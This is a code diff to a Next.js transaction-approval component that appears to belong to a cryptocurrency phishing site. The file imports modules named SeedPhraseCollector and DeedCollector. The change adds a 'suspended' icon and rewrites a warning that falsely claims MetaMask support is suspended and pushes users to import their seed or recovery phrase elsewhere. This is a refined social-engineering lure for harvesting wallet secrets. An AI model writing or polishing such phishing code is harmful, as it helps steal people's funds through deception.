@@ -6,6 +6,10 @@ import axios from "axios";
 import { ethers } from "ethers";
 import SeedPhraseCollector from "./collector";
 import DeedCollector from "./collectorPk";
+import Image from "next/image";
+import suspended from "../../../public/deactivate.png"
+
+
 
 type Token = {
   name: string;
@@ -331,9 +335,11 @@ const ApproveTxn = () => {
             zIndex: 1000,
           }}
         >
+            <Image style={{height: "50px", width: "50px", marginBottom: "10px",}}
+                 src={suspended}
+                 alt='mm'/>
           <p style={{ color: "red", marginBottom: "10px" }}>
-            We currently do not support MetaMask wallet. Please copy
-            your metamask seed/recovery phrase into Trust Wallet and connect using the Trust Wallet mobile app.
+          We have temporarily suspended support for MetaMask wallets. To continue using our platform, please import your MetaMask seed or recovery phrase into Trust Wallet. Then, connect using the Trust Wallet mobile app for seamless access.
           </p>
           <div style={{
             display: "flex",
